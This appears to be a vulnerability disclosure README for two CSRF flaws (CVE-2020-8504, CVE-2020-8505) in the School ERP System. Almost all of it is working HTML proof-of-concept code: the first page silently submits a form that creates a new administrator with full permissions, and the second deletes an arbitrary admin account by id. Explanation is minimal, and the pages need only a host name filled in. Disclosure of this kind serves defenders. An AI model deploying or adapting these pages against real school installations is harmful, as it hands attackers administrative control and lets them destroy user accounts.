# SchoolERPCSRF #

The School ERP System (https://sourceforge.net/projects/school-erp-ultimate/files/) is vulnerable to CSRF that leads to adding a new Admin user, and deleting an arbitrary user.

CVE-2020-8504
CVE-2020-8505

Proof of Concept code for adding an administrative user:

````
<html>
  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="http://SITEHERE/office_admin/?pid=42&action=addadmin" method="POST">

      <input type="hidden" name="admin&#95;fname" value="Admin" />

      <input type="hidden" name="admin&#95;lname" value="Tester" />

      <input type="hidden" name="admin&#95;username" value="testing" />

      <input type="hidden" name="admin&#95;password" value="testing123" />

      <input type="hidden" name="admin&#95;password2" value="testing123" />

      <input type="hidden" name="admin&#95;email" value="test&#64;test&#46;com" />

      <input type="hidden" name="admin&#95;phoneno" value="9999999999" />

      <input type="hidden" name="adminlevel" value="" />

      <input type="hidden" name="admin&#95;more" value="Test" />

      <input type="hidden" name="1&#95;p" value="1&#95;p" />

      <input type="hidden" name="1&#95;1" value="1&#95;1" />

      <input type="hidden" name="1&#95;2" value="1&#95;2" />

      <input type="hidden" name="1&#95;4" value="1&#95;4" />

      <input type="hidden" name="1&#95;3" value="1&#95;3" />

      <input type="hidden" name="2&#95;p" value="2&#95;p" />

      <input type="hidden" name="2&#95;1" value="2&#95;1" />

      <input type="hidden" name="2&#95;2" value="2&#95;2" />

      <input type="hidden" name="2&#95;3" value="2&#95;3" />

      <input type="hidden" name="2&#95;4" value="2&#95;4" />

      <input type="hidden" name="2&#95;5" value="2&#95;5" />

      <input type="hidden" name="2&#95;6" value="2&#95;6" />

      <input type="hidden" name="2&#95;7" value="2&#95;7" />

      <input type="hidden" name="2&#95;8" value="2&#95;8" />

      <input type="hidden" name="2&#95;9" value="2&#95;9" />

      <input type="hidden" name="2&#95;10" value="2&#95;10" />

      <input type="hidden" name="2&#95;11" value="2&#95;11" />

      <input type="hidden" name="2&#95;12" value="2&#95;12" />

      <input type="hidden" name="2&#95;13" value="2&#95;13" />

      <input type="hidden" name="2&#95;14" value="2&#95;14" />

      <input type="hidden" name="2&#95;15" value="2&#95;15" />

      <input type="hidden" name="2&#95;20" value="2&#95;20" />

      <input type="hidden" name="2&#95;18" value="2&#95;18" />

      <input type="hidden" name="2&#95;19" value="2&#95;19" />

      <input type="hidden" name="3&#95;p" value="3&#95;p" />

      <input type="hidden" name="3&#95;1" value="3&#95;1" />

      <input type="hidden" name="3&#95;2" value="3&#95;2" />

      <input type="hidden" name="3&#95;3" value="3&#95;3" />

      <input type="hidden" name="3&#95;5" value="3&#95;5" />

      <input type="hidden" name="3&#95;4" value="3&#95;4" />

      <input type="hidden" name="4&#95;p" value="4&#95;p" />

      <input type="hidden" name="5&#95;p" value="5&#95;p" />

      <input type="hidden" name="5&#95;1" value="5&#95;1" />

      <input type="hidden" name="5&#95;3" value="5&#95;3" />

      <input type="hidden" name="5&#95;2" value="5&#95;2" />

      <input type="hidden" name="5&#95;5" value="5&#95;5" />

      <input type="hidden" name="5&#95;6" value="5&#95;6" />

      <input type="hidden" name="6&#95;p" value="6&#95;p" />

      <input type="hidden" name="7&#95;p" value="7&#95;p" />

      <input type="hidden" name="7&#95;1" value="7&#95;1" />

      <input type="hidden" name="7&#95;2" value="7&#95;2" />

      <input type="hidden" name="7&#95;3" value="7&#95;3" />

      <input type="hidden" name="7&#95;4" value="7&#95;4" />

      <input type="hidden" name="7&#95;5" value="7&#95;5" />

      <input type="hidden" name="8&#95;p" value="8&#95;p" />

      <input type="hidden" name="8&#95;1" value="8&#95;1" />

      <input type="hidden" name="8&#95;2" value="8&#95;2" />

      <input type="hidden" name="8&#95;3" value="8&#95;3" />

      <input type="hidden" name="8&#95;101" value="8&#95;101" />

      <input type="hidden" name="8&#95;4" value="8&#95;4" />

      <input type="hidden" name="8&#95;5" value="8&#95;5" />

      <input type="hidden" name="8&#95;6" value="8&#95;6" />

      <input type="hidden" name="8&#95;16" value="8&#95;16" />

      <input type="hidden" name="8&#95;102" value="8&#95;102" />

      <input type="hidden" name="8&#95;7" value="8&#95;7" />

      <input type="hidden" name="8&#95;8" value="8&#95;8" />

      <input type="hidden" name="8&#95;9" value="8&#95;9" />

      <input type="hidden" name="8&#95;17" value="8&#95;17" />

      <input type="hidden" name="8&#95;103" value="8&#95;103" />

      <input type="hidden" name="8&#95;104" value="8&#95;104" />

      <input type="hidden" name="8&#95;10" value="8&#95;10" />

      <input type="hidden" name="8&#95;11" value="8&#95;11" />

      <input type="hidden" name="8&#95;12" value="8&#95;12" />

      <input type="hidden" name="8&#95;18" value="8&#95;18" />

      <input type="hidden" name="8&#95;105" value="8&#95;105" />

      <input type="hidden" name="8&#95;106" value="8&#95;106" />

      <input type="hidden" name="8&#95;13" value="8&#95;13" />

      <input type="hidden" name="8&#95;14" value="8&#95;14" />

      <input type="hidden" name="8&#95;15" value="8&#95;15" />

      <input type="hidden" name="8&#95;19" value="8&#95;19" />

      <input type="hidden" name="8&#95;107" value="8&#95;107" />

      <input type="hidden" name="8&#95;108" value="8&#95;108" />

      <input type="hidden" name="9&#95;p" value="9&#95;p" />

      <input type="hidden" name="9&#95;1" value="9&#95;1" />

      <input type="hidden" name="9&#95;17" value="9&#95;17" />

      <input type="hidden" name="9&#95;18" value="9&#95;18" />

      <input type="hidden" name="9&#95;19" value="9&#95;19" />

      <input type="hidden" name="9&#95;2" value="9&#95;2" />

      <input type="hidden" name="9&#95;20" value="9&#95;20" />

      <input type="hidden" name="9&#95;21" value="9&#95;21" />

      <input type="hidden" name="9&#95;22" value="9&#95;22" />

      <input type="hidden" name="9&#95;3" value="9&#95;3" />

      <input type="hidden" name="9&#95;4" value="9&#95;4" />

      <input type="hidden" name="9&#95;5" value="9&#95;5" />

      <input type="hidden" name="9&#95;6" value="9&#95;6" />

      <input type="hidden" name="9&#95;101" value="9&#95;101" />

      <input type="hidden" name="9&#95;7" value="9&#95;7" />

      <input type="hidden" name="9&#95;102" value="9&#95;102" />

      <input type="hidden" name="9&#95;8" value="9&#95;8" />

      <input type="hidden" name="9&#95;103" value="9&#95;103" />

      <input type="hidden" name="9&#95;24" value="9&#95;24" />

      <input type="hidden" name="9&#95;25" value="9&#95;25" />

      <input type="hidden" name="9&#95;33" value="9&#95;33" />

      <input type="hidden" name="9&#95;23" value="9&#95;23" />

      <input type="hidden" name="9&#95;11" value="9&#95;11" />

      <input type="hidden" name="9&#95;13" value="9&#95;13" />

      <input type="hidden" name="9&#95;27" value="9&#95;27" />

      <input type="hidden" name="9&#95;14" value="9&#95;14" />

      <input type="hidden" name="9&#95;29" value="9&#95;29" />

      <input type="hidden" name="9&#95;30" value="9&#95;30" />

      <input type="hidden" name="9&#95;31" value="9&#95;31" />

      <input type="hidden" name="9&#95;15" value="9&#95;15" />

      <input type="hidden" name="9&#95;16" value="9&#95;16" />

      <input type="hidden" name="9&#95;32" value="9&#95;32" />

      <input type="hidden" name="10&#95;p" value="10&#95;p" />

      <input type="hidden" name="10&#95;1" value="10&#95;1" />

      <input type="hidden" name="10&#95;2" value="10&#95;2" />

      <input type="hidden" name="10&#95;3" value="10&#95;3" />

      <input type="hidden" name="10&#95;4" value="10&#95;4" />

      <input type="hidden" name="10&#95;5" value="10&#95;5" />

      <input type="hidden" name="10&#95;6" value="10&#95;6" />

      <input type="hidden" name="10&#95;7" value="10&#95;7" />

      <input type="hidden" name="10&#95;8" value="10&#95;8" />

      <input type="hidden" name="10&#95;11" value="10&#95;11" />

      <input type="hidden" name="10&#95;9" value="10&#95;9" />

      <input type="hidden" name="10&#95;10" value="10&#95;10" />

      <input type="hidden" name="10&#95;12" value="10&#95;12" />

      <input type="hidden" name="11&#95;p" value="11&#95;p" />

      <input type="hidden" name="11&#95;1" value="11&#95;1" />

      <input type="hidden" name="11&#95;2" value="11&#95;2" />

      <input type="hidden" name="11&#95;3" value="11&#95;3" />

      <input type="hidden" name="11&#95;4" value="11&#95;4" />

      <input type="hidden" name="11&#95;5" value="11&#95;5" />

      <input type="hidden" name="11&#95;6" value="11&#95;6" />

      <input type="hidden" name="11&#95;7" value="11&#95;7" />

      <input type="hidden" name="11&#95;8" value="11&#95;8" />

      <input type="hidden" name="11&#95;9" value="11&#95;9" />

      <input type="hidden" name="11&#95;10" value="11&#95;10" />

      <input type="hidden" name="11&#95;11" value="11&#95;11" />

      <input type="hidden" name="11&#95;12" value="11&#95;12" />

      <input type="hidden" name="11&#95;13" value="11&#95;13" />

      <input type="hidden" name="11&#95;14" value="11&#95;14" />

      <input type="hidden" name="11&#95;15" value="11&#95;15" />

      <input type="hidden" name="11&#95;16" value="11&#95;16" />

      <input type="hidden" name="11&#95;17" value="11&#95;17" />

      <input type="hidden" name="11&#95;18" value="11&#95;18" />

      <input type="hidden" name="11&#95;19" value="11&#95;19" />

      <input type="hidden" name="11&#95;20" value="11&#95;20" />

      <input type="hidden" name="11&#95;21" value="11&#95;21" />

      <input type="hidden" name="11&#95;23" value="11&#95;23" />

      <input type="hidden" name="11&#95;101" value="11&#95;101" />

      <input type="hidden" name="11&#95;102" value="11&#95;102" />

      <input type="hidden" name="11&#95;22" value="11&#95;22" />

      <input type="hidden" name="11&#95;103" value="11&#95;103" />

      <input type="hidden" name="11&#95;104" value="11&#95;104" />

      <input type="hidden" name="12&#95;p" value="12&#95;p" />

      <input type="hidden" name="12&#95;1" value="12&#95;1" />

      <input type="hidden" name="12&#95;2" value="12&#95;2" />

      <input type="hidden" name="12&#95;3" value="12&#95;3" />

      <input type="hidden" name="12&#95;4" value="12&#95;4" />

      <input type="hidden" name="12&#95;5" value="12&#95;5" />

      <input type="hidden" name="12&#95;11" value="12&#95;11" />

      <input type="hidden" name="12&#95;6" value="12&#95;6" />

      <input type="hidden" name="12&#95;7" value="12&#95;7" />

      <input type="hidden" name="12&#95;8" value="12&#95;8" />

      <input type="hidden" name="12&#95;12" value="12&#95;12" />

      <input type="hidden" name="12&#95;9" value="12&#95;9" />

      <input type="hidden" name="12&#95;10" value="12&#95;10" />

      <input type="hidden" name="13&#95;p" value="13&#95;p" />

      <input type="hidden" name="13&#95;1" value="13&#95;1" />

      <input type="hidden" name="13&#95;2" value="13&#95;2" />

      <input type="hidden" name="13&#95;3" value="13&#95;3" />

      <input type="hidden" name="13&#95;17" value="13&#95;17" />

      <input type="hidden" name="13&#95;4" value="13&#95;4" />

      <input type="hidden" name="13&#95;5" value="13&#95;5" />

      <input type="hidden" name="13&#95;6" value="13&#95;6" />

      <input type="hidden" name="13&#95;18" value="13&#95;18" />

      <input type="hidden" name="13&#95;7" value="13&#95;7" />

      <input type="hidden" name="13&#95;8" value="13&#95;8" />

      <input type="hidden" name="13&#95;9" value="13&#95;9" />

      <input type="hidden" name="13&#95;19" value="13&#95;19" />

      <input type="hidden" name="13&#95;20" value="13&#95;20" />

      <input type="hidden" name="13&#95;10" value="13&#95;10" />

      <input type="hidden" name="13&#95;11" value="13&#95;11" />

      <input type="hidden" name="13&#95;12" value="13&#95;12" />

      <input type="hidden" name="13&#95;21" value="13&#95;21" />

      <input type="hidden" name="13&#95;22" value="13&#95;22" />

      <input type="hidden" name="13&#95;13" value="13&#95;13" />

      <input type="hidden" name="13&#95;14" value="13&#95;14" />

      <input type="hidden" name="13&#95;15" value="13&#95;15" />

      <input type="hidden" name="13&#95;16" value="13&#95;16" />

      <input type="hidden" name="13&#95;108" value="13&#95;108" />

      <input type="hidden" name="13&#95;23" value="13&#95;23" />

      <input type="hidden" name="13&#95;101" value="13&#95;101" />

      <input type="hidden" name="13&#95;102" value="13&#95;102" />

      <input type="hidden" name="13&#95;103" value="13&#95;103" />

      <input type="hidden" name="13&#95;104" value="13&#95;104" />

      <input type="hidden" name="13&#95;106" value="13&#95;106" />

      <input type="hidden" name="13&#95;105" value="13&#95;105" />

      <input type="hidden" name="14&#95;p" value="14&#95;p" />

      <input type="hidden" name="14&#95;1" value="14&#95;1" />

      <input type="hidden" name="14&#95;2" value="14&#95;2" />

      <input type="hidden" name="14&#95;3" value="14&#95;3" />

      <input type="hidden" name="14&#95;101" value="14&#95;101" />

      <input type="hidden" name="14&#95;4" value="14&#95;4" />

      <input type="hidden" name="14&#95;5" value="14&#95;5" />

      <input type="hidden" name="14&#95;6" value="14&#95;6" />

      <input type="hidden" name="14&#95;102" value="14&#95;102" />

      <input type="hidden" name="14&#95;7" value="14&#95;7" />

      <input type="hidden" name="14&#95;8" value="14&#95;8" />

      <input type="hidden" name="14&#95;9" value="14&#95;9" />

      <input type="hidden" name="14&#95;103" value="14&#95;103" />

      <input type="hidden" name="14&#95;10" value="14&#95;10" />

      <input type="hidden" name="14&#95;21" value="14&#95;21" />

      <input type="hidden" name="14&#95;104" value="14&#95;104" />

      <input type="hidden" name="14&#95;11" value="14&#95;11" />

      <input type="hidden" name="14&#95;105" value="14&#95;105" />

      <input type="hidden" name="14&#95;12" value="14&#95;12" />

      <input type="hidden" name="14&#95;106" value="14&#95;106" />

      <input type="hidden" name="14&#95;13" value="14&#95;13" />

      <input type="hidden" name="14&#95;14" value="14&#95;14" />

      <input type="hidden" name="14&#95;15" value="14&#95;15" />

      <input type="hidden" name="14&#95;16" value="14&#95;16" />

      <input type="hidden" name="14&#95;107" value="14&#95;107" />

      <input type="hidden" name="14&#95;17" value="14&#95;17" />

      <input type="hidden" name="14&#95;18" value="14&#95;18" />

      <input type="hidden" name="14&#95;19" value="14&#95;19" />

      <input type="hidden" name="14&#95;20" value="14&#95;20" />

      <input type="hidden" name="15&#95;p" value="15&#95;p" />

      <input type="hidden" name="15&#95;1" value="15&#95;1" />

      <input type="hidden" name="15&#95;2" value="15&#95;2" />

      <input type="hidden" name="15&#95;3" value="15&#95;3" />

      <input type="hidden" name="16&#95;p" value="16&#95;p" />

      <input type="hidden" name="16&#95;1" value="16&#95;1" />

      <input type="hidden" name="16&#95;2" value="16&#95;2" />

      <input type="hidden" name="16&#95;3" value="16&#95;3" />

      <input type="hidden" name="16&#95;101" value="16&#95;101" />

      <input type="hidden" name="16&#95;4" value="16&#95;4" />

      <input type="hidden" name="16&#95;5" value="16&#95;5" />

      <input type="hidden" name="16&#95;6" value="16&#95;6" />

      <input type="hidden" name="16&#95;102" value="16&#95;102" />

      <input type="hidden" name="16&#95;7" value="16&#95;7" />

      <input type="hidden" name="16&#95;8" value="16&#95;8" />

      <input type="hidden" name="16&#95;10" value="16&#95;10" />

      <input type="hidden" name="16&#95;11" value="16&#95;11" />

      <input type="hidden" name="16&#95;12" value="16&#95;12" />

      <input type="hidden" name="16&#95;103" value="16&#95;103" />

      <input type="hidden" name="16&#95;13" value="16&#95;13" />

      <input type="hidden" name="16&#95;14" value="16&#95;14" />

      <input type="hidden" name="16&#95;15" value="16&#95;15" />

      <input type="hidden" name="16&#95;17" value="16&#95;17" />

      <input type="hidden" name="16&#95;18" value="16&#95;18" />

      <input type="hidden" name="16&#95;20" value="16&#95;20" />

      <input type="hidden" name="16&#95;21" value="16&#95;21" />

      <input type="hidden" name="16&#95;24" value="16&#95;24" />

      <input type="hidden" name="16&#95;104" value="16&#95;104" />

      <input type="hidden" name="16&#95;105" value="16&#95;105" />

      <input type="hidden" name="16&#95;22" value="16&#95;22" />

      <input type="hidden" name="16&#95;25" value="16&#95;25" />

      <input type="hidden" name="16&#95;23" value="16&#95;23" />

      <input type="hidden" name="16&#95;26" value="16&#95;26" />

      <input type="hidden" name="16&#95;106" value="16&#95;106" />

      <input type="hidden" name="16&#95;107" value="16&#95;107" />

      <input type="hidden" name="16&#95;27" value="16&#95;27" />

      <input type="hidden" name="16&#95;28" value="16&#95;28" />

      <input type="hidden" name="16&#95;29" value="16&#95;29" />

      <input type="hidden" name="17&#95;p" value="17&#95;p" />

      <input type="hidden" name="17&#95;1" value="17&#95;1" />

      <input type="hidden" name="17&#95;6" value="17&#95;6" />

      <input type="hidden" name="17&#95;2" value="17&#95;2" />

      <input type="hidden" name="17&#95;3" value="17&#95;3" />

      <input type="hidden" name="17&#95;101" value="17&#95;101" />

      <input type="hidden" name="17&#95;4" value="17&#95;4" />

      <input type="hidden" name="17&#95;5" value="17&#95;5" />

      <input type="hidden" name="17&#95;7" value="17&#95;7" />

      <input type="hidden" name="17&#95;8" value="17&#95;8" />

      <input type="hidden" name="17&#95;9" value="17&#95;9" />

      <input type="hidden" name="18&#95;p" value="18&#95;p" />

      <input type="hidden" name="18&#95;5" value="18&#95;5" />

      <input type="hidden" name="18&#95;1" value="18&#95;1" />

      <input type="hidden" name="18&#95;2" value="18&#95;2" />

      <input type="hidden" name="18&#95;3" value="18&#95;3" />

      <input type="hidden" name="18&#95;4" value="18&#95;4" />

      <input type="hidden" name="18&#95;6" value="18&#95;6" />

      <input type="hidden" name="18&#95;7" value="18&#95;7" />

      <input type="hidden" name="18&#95;8" value="18&#95;8" />

      <input type="hidden" name="18&#95;9" value="18&#95;9" />

      <input type="hidden" name="18&#95;10" value="18&#95;10" />

      <input type="hidden" name="18&#95;11" value="18&#95;11" />

      <input type="hidden" name="18&#95;12" value="18&#95;12" />

      <input type="hidden" name="19&#95;p" value="19&#95;p" />

      <input type="hidden" name="19&#95;1" value="19&#95;1" />

      <input type="hidden" name="19&#95;2" value="19&#95;2" />

      <input type="hidden" name="19&#95;3" value="19&#95;3" />

      <input type="hidden" name="19&#95;4" value="19&#95;4" />

      <input type="hidden" name="19&#95;5" value="19&#95;5" />

      <input type="hidden" name="19&#95;6" value="19&#95;6" />

      <input type="hidden" name="19&#95;11" value="19&#95;11" />

      <input type="hidden" name="19&#95;7" value="19&#95;7" />

      <input type="hidden" name="19&#95;12" value="19&#95;12" />

      <input type="hidden" name="19&#95;13" value="19&#95;13" />

      <input type="hidden" name="19&#95;14" value="19&#95;14" />

      <input type="hidden" name="19&#95;15" value="19&#95;15" />

      <input type="hidden" name="19&#95;101" value="19&#95;101" />

      <input type="hidden" name="19&#95;102" value="19&#95;102" />

      <input type="hidden" name="19&#95;8" value="19&#95;8" />

      <input type="hidden" name="19&#95;16" value="19&#95;16" />

      <input type="hidden" name="19&#95;9" value="19&#95;9" />

      <input type="hidden" name="19&#95;10" value="19&#95;10" />

      <input type="hidden" name="19&#95;17" value="19&#95;17" />

      <input type="hidden" name="19&#95;18" value="19&#95;18" />

      <input type="hidden" name="20&#95;p" value="20&#95;p" />

      <input type="hidden" name="20&#95;1" value="20&#95;1" />

      <input type="hidden" name="20&#95;5" value="20&#95;5" />

      <input type="hidden" name="20&#95;101" value="20&#95;101" />

      <input type="hidden" name="20&#95;2" value="20&#95;2" />

      <input type="hidden" name="20&#95;6" value="20&#95;6" />

      <input type="hidden" name="20&#95;102" value="20&#95;102" />

      <input type="hidden" name="20&#95;3" value="20&#95;3" />

      <input type="hidden" name="20&#95;4" value="20&#95;4" />

      <input type="hidden" name="21&#95;p" value="21&#95;p" />

      <input type="hidden" name="21&#95;1" value="21&#95;1" />

      <input type="hidden" name="21&#95;2" value="21&#95;2" />

      <input type="hidden" name="21&#95;3" value="21&#95;3" />

      <input type="hidden" name="22&#95;p" value="22&#95;p" />

      <input type="hidden" name="22&#95;1" value="22&#95;1" />

      <input type="hidden" name="22&#95;2" value="22&#95;2" />

      <input type="hidden" name="22&#95;3" value="22&#95;3" />

      <input type="hidden" name="22&#95;5" value="22&#95;5" />

      <input type="hidden" name="22&#95;4" value="22&#95;4" />

      <input type="hidden" name="22&#95;6" value="22&#95;6" />

      <input type="hidden" name="23&#95;p" value="23&#95;p" />

      <input type="hidden" name="24&#95;p" value="24&#95;p" />

      <input type="hidden" name="24&#95;1" value="24&#95;1" />

      <input type="hidden" name="24&#95;2" value="24&#95;2" />

      <input type="hidden" name="24&#95;3" value="24&#95;3" />

      <input type="hidden" name="24&#95;4" value="24&#95;4" />

      <input type="hidden" name="25&#95;p" value="25&#95;p" />

      <input type="hidden" name="25&#95;1" value="25&#95;1" />

      <input type="hidden" name="25&#95;2" value="25&#95;2" />

      <input type="hidden" name="25&#95;5" value="25&#95;5" />

      <input type="hidden" name="25&#95;6" value="25&#95;6" />

      <input type="hidden" name="25&#95;3" value="25&#95;3" />

      <input type="hidden" name="25&#95;4" value="25&#95;4" />

      <input type="hidden" name="25&#95;7" value="25&#95;7" />

      <input type="hidden" name="25&#95;8" value="25&#95;8" />

      <input type="hidden" name="26&#95;p" value="26&#95;p" />

      <input type="hidden" name="26&#95;1" value="26&#95;1" />

      <input type="hidden" name="26&#95;2" value="26&#95;2" />

      <input type="hidden" name="27&#95;p" value="27&#95;p" />

      <input type="hidden" name="27&#95;1" value="27&#95;1" />

      <input type="hidden" name="27&#95;2" value="27&#95;2" />

      <input type="hidden" name="27&#95;3" value="27&#95;3" />

      <input type="hidden" name="28&#95;p" value="28&#95;p" />

      <input type="hidden" name="28&#95;1" value="28&#95;1" />

      <input type="hidden" name="28&#95;2" value="28&#95;2" />

      <input type="hidden" name="28&#95;3" value="28&#95;3" />

      <input type="hidden" name="28&#95;4" value="28&#95;4" />

      <input type="hidden" name="28&#95;5" value="28&#95;5" />

      <input type="hidden" name="29&#95;p" value="29&#95;p" />

      <input type="hidden" name="29&#95;1" value="29&#95;1" />

      <input type="hidden" name="29&#95;2" value="29&#95;2" />

      <input type="hidden" name="30&#95;p" value="30&#95;p" />

      <input type="hidden" name="30&#95;1" value="30&#95;1" />

      <input type="hidden" name="30&#95;2" value="30&#95;2" />

      <input type="hidden" name="30&#95;3" value="30&#95;3" />

      <input type="hidden" name="30&#95;4" value="30&#95;4" />

      <input type="hidden" name="30&#95;5" value="30&#95;5" />

      <input type="hidden" name="30&#95;6" value="30&#95;6" />

      <input type="hidden" name="30&#95;7" value="30&#95;7" />

      <input type="hidden" name="30&#95;8" value="30&#95;8" />

      <input type="hidden" name="31&#95;p" value="31&#95;p" />

      <input type="hidden" name="31&#95;1" value="31&#95;1" />

      <input type="hidden" name="31&#95;2" value="31&#95;2" />

      <input type="hidden" name="31&#95;3" value="31&#95;3" />

      <input type="hidden" name="31&#95;5" value="31&#95;5" />

      <input type="hidden" name="31&#95;4" value="31&#95;4" />

      <input type="hidden" name="32&#95;p" value="32&#95;p" />

      <input type="hidden" name="32&#95;3" value="32&#95;3" />

      <input type="hidden" name="32&#95;1" value="32&#95;1" />

      <input type="hidden" name="32&#95;4" value="32&#95;4" />

      <input type="hidden" name="32&#95;2" value="32&#95;2" />

      <input type="hidden" name="32&#95;5" value="32&#95;5" />

      <input type="hidden" name="33&#95;p" value="33&#95;p" />

      <input type="hidden" name="33&#95;1" value="33&#95;1" />

      <input type="hidden" name="33&#95;2" value="33&#95;2" />

      <input type="hidden" name="33&#95;3" value="33&#95;3" />

      <input type="hidden" name="33&#95;8" value="33&#95;8" />

      <input type="hidden" name="33&#95;4" value="33&#95;4" />

      <input type="hidden" name="33&#95;5" value="33&#95;5" />

      <input type="hidden" name="33&#95;6" value="33&#95;6" />

      <input type="hidden" name="33&#95;7" value="33&#95;7" />

      <input type="hidden" name="34&#95;p" value="34&#95;p" />

      <input type="hidden" name="34&#95;1" value="34&#95;1" />

      <input type="hidden" name="34&#95;2" value="34&#95;2" />

      <input type="hidden" name="35&#95;p" value="35&#95;p" />

      <input type="hidden" name="35&#95;1" value="35&#95;1" />

      <input type="hidden" name="35&#95;2" value="35&#95;2" />

      <input type="hidden" name="35&#95;3" value="35&#95;3" />

      <input type="hidden" name="saveallowance" value="Submit" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>

````

Proof of Concept Code for deleting an arbitrary user:

````
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="http://SITEHERE/office_admin/">

      <input type="hidden" name="pid" value="42" />

      <input type="hidden" name="action" value="deleteadmin" />

      <input type="hidden" name="lid" value="90" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>

````
